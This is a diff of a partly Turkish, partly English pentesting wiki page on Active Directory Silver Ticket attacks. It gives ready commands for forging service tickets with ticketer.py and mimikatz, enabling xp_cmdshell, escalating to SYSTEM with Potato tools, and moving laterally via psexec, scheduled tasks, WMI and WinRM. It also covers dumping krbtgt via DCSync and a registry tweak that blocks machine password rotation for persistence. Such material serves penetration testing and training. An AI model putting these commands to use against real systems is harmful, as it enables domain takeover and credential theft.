@@ -6,15 +6,15 @@
 
 ## Silver ticket
 
-**Silver Ticket** saldırısı, Active Directory (AD) ortamlarındaki service tickets'ın istismarıyla ilgilidir. Bu yöntem, bir computer account gibi bir service account'un **acquiring the NTLM hash of a service account** işlemini gerektirir; bu hash ile bir Ticket Granting Service (TGS) ticket'ı sahte olarak oluşturulur. Bu sahte ticket ile saldırgan, ağdaki belirli servislere erişebilir ve genellikle yönetici ayrıcalıklarını hedefleyerek **impersonating any user** yapabilir. Ticket oluştururken AES keys kullanmanın daha güvenli ve daha az tespit edilebilir olduğu vurgulanır.
+The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
 
 > [!WARNING]
 > Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
-> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.
+Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.
 
-For ticket crafting, different tools are employed based on the operating system:
+Bilet oluşturma (ticket crafting) için, kullanılan araçlar işletim sistemine göre farklılık gösterir:
 
-### Linux'ta
+### Linux üzerinde
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -37,11 +37,11 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-CIFS servisi, hedefin dosya sistemine erişmek için yaygın bir hedef olarak öne çıkar, ancak HOST ve RPCSS gibi diğer servisler de görevler ve WMI sorguları için sömürülebilir.
+CIFS servisi, hedefin dosya sistemine erişim için yaygın bir hedef olarak vurgulanır; ancak HOST ve RPCSS gibi diğer servisler de görevler ve WMI sorguları için istismar edilebilir.
 
-### Örnek: MSSQL servisi (MSSQLSvc) + Potato ile SYSTEM'e
+### Örnek: MSSQL servisi (MSSQLSvc) + Potato to SYSTEM
 
-Eğer bir SQL servis hesabının (ör. sqlsvc) NTLM hash'ine (veya AES anahtarına) sahipseniz, MSSQL SPN için bir TGS sahteleyebilir ve SQL servisine karşı herhangi bir kullanıcıyı taklit edebilirsiniz. Buradan xp_cmdshell'i etkinleştirip SQL servis hesabı olarak komut çalıştırabilirsiniz. Eğer o token SeImpersonatePrivilege'e sahipse, Potato kullanarak SYSTEM'e yükseltebilirsiniz.
+If you have the NTLM hash (or AES key) of a SQL service account (e.g., sqlsvc) you can forge a TGS for the MSSQL SPN and impersonate any user to the SQL service. From there, enable xp_cmdshell to execute commands as the SQL service account. If that token has SeImpersonatePrivilege, chain a Potato to elevate to SYSTEM.
 ```bash
 # Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
 python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -52,14 +52,14 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- Eğer ortaya çıkan bağlamda SeImpersonatePrivilege varsa (genellikle hizmet hesapları için geçerlidir), SYSTEM elde etmek için bir Potato varyantı kullanın:
+- Eğer ortaya çıkan bağlam SeImpersonatePrivilege'e sahipse (genellikle hizmet hesapları için geçerlidir), SYSTEM elde etmek için bir Potato varyantı kullanın:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-MSSQL'i kötüye kullanma ve xp_cmdshell'i etkinleştirme hakkında daha fazla detay:
+MSSQL'in kötüye kullanılması ve xp_cmdshell'in etkinleştirilmesi hakkında daha fazla detay:
 
 {{#ref}}
 abusing-ad-mssql.md
@@ -73,7 +73,7 @@ Potato tekniklerine genel bakış:
 
 ## Mevcut Servisler
 
-| Servis Türü                                | Servis Silver Tickets                                                      |
+| Servis Türü                                | Servis Silver Tickets                                                       |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
 | PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
@@ -84,11 +84,11 @@ Potato tekniklerine genel bakış:
 | Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Golden Tickets                             | krbtgt                                                                     |
 
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+Rubeus kullanarak bu ticket'ların tümünü şu parametre ile isteyebilirsiniz:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Event IDs
+### Silver tickets Olay ID'leri
 
 - 4624: Account Logon
 - 4634: Account Logoff
@@ -96,30 +96,30 @@ Using **Rubeus** you may **ask for all** these tickets using the parameter:
 
 ## Kalıcılık
 
-Makinelerin parolalarını her 30 günde bir değiştirmelerini önlemek için `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` olarak ayarlayabilirsiniz veya makinelerin parola döndürme süresini göstermek için `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` değerini 30days'den daha büyük bir değere ayarlayabilirsiniz.
+Makinelerin parolalarını her 30 günde bir döndürmesini engellemek için `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` olarak ayarlayabilir ya da makinelerin parolasının ne zaman döndürüleceğini göstermek için `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` değerini 30 günden daha büyük bir değere ayarlayabilirsiniz.
 
-## Servis ticket'larının kötüye kullanımı
+## Service ticket'larının kötüye kullanımı
 
-Aşağıdaki örneklerde ticket'ın administrator hesabı taklidi yapılarak elde edildiğini varsayalım.
+Aşağıdaki örneklerde ticket'in yönetici hesabını taklit ederek elde edildiğini varsayalım.
 
 ### CIFS
 
-Bu ticket ile `C$` ve `ADMIN$` klasörlerine **SMB** üzerinden (eğer açığa çıkmışlarsa) erişebilir ve uzak dosya sistemine dosya kopyalayabilirsiniz, örneğin:
+Bu ticket ile `C$` ve `ADMIN$` klasörlerine **SMB** üzerinden (eğer erişilebilirlerse) erişebilir ve uzak dosya sisteminin bir bölümüne dosya kopyalamak için şu şekilde işlem yapabilirsiniz:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-Ayrıca konakta bir shell elde edebilir veya **psexec** kullanarak istediğiniz komutları çalıştırabilirsiniz:
+Ayrıca host içinde bir shell elde edebilir veya **psexec** kullanarak herhangi bir komutu çalıştırabilirsiniz:
 
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
 {{#endref}}
 
-### KONAK
+### HOST
 
-Bu izinle uzak bilgisayarlarda zamanlanmış görevler oluşturabilir ve istediğiniz komutları çalıştırabilirsiniz:
+Bu izinle uzak bilgisayarlarda zamanlanmış görevler oluşturabilir ve herhangi bir komutu çalıştırabilirsiniz:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -133,7 +133,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-Bu biletlerle hedef sistemde **WMI çalıştırabilirsiniz**:
+Bu tickets ile hedef sistemde **WMI çalıştırabilirsiniz**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -143,7 +143,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-Aşağıdaki sayfada **wmiexec hakkında daha fazla bilgi** bulun:
+wmiexec hakkında **daha fazla bilgi** için aşağıdaki sayfaya bakın:
 
 
 {{#ref}}
@@ -152,11 +152,11 @@ Aşağıdaki sayfada **wmiexec hakkında daha fazla bilgi** bulun:
 
 ### HOST + WSMAN (WINRM)
 
-Winrm erişimi ile bir bilgisayara **erişebilirsiniz** ve hatta PowerShell elde edebilirsiniz:
+Bir bilgisayarda winrm erişiminiz olduğunda ona **erişebilir** ve hatta PowerShell alabilirsiniz:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Uzak hosta winrm kullanarak bağlanmanın **daha fazla yolunu** öğrenmek için aşağıdaki sayfayı inceleyin:
+Uzak bir hosta bağlanmanın **winrm kullanarak daha fazla yolunu** öğrenmek için aşağıdaki sayfaya bakın:
 
 
 {{#ref}}
@@ -164,7 +164,7 @@ Uzak hosta winrm kullanarak bağlanmanın **daha fazla yolunu** öğrenmek için
 {{#endref}}
 
 > [!WARNING]
-> Erişim için **winrm'in uzak bilgisayarda aktif ve dinliyor olması** gerektiğini unutmayın.
+> Uzak bilgisayara erişim için **winrm'in etkin ve dinliyor olması gerektiğini** unutmayın.
 
 ### LDAP
 
@@ -172,7 +172,7 @@ Bu ayrıcalıkla **DCSync** kullanarak DC veritabanını dökebilirsiniz:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**DCSync hakkında daha fazla bilgi edinin** aşağıdaki sayfada:
+**DCSync hakkında daha fazla bilgi edinin** için aşağıdaki sayfaya bakın:
 
 
 {{#ref}}
